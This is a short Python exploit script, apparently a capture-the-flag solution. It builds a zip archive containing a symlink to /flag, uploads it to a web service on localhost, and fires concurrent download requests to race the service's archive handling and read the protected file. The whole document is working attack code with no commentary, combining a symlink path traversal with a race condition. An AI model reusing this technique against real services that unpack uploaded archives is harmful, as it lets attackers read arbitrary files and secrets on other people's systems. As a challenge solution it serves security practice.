import httpx
import zipfile
import os
import threading

os.system("rm -f exp.zip file")

with zipfile.ZipFile("exp.zip", "w") as zf:
    for _ in range(11):
        zf.writestr(os.urandom(4).hex(), b"a")

os.system("ln -s /flag file")
os.system("zip --symlinks exp.zip file")

with open("exp.zip", "rb") as f:
    zipdata = f.read()


c = httpx.Client(base_url="http://localhost:11000")
print(c.get("/enter/test").json())


def thread():
    for _ in range(3):
        print(c.get("/download/f").text)

for _ in range(10):
    threading.Thread(target=thread).start()

print(c.post("/upload", files={"data": ("data.zip", zipdata, "application/zip")}).text)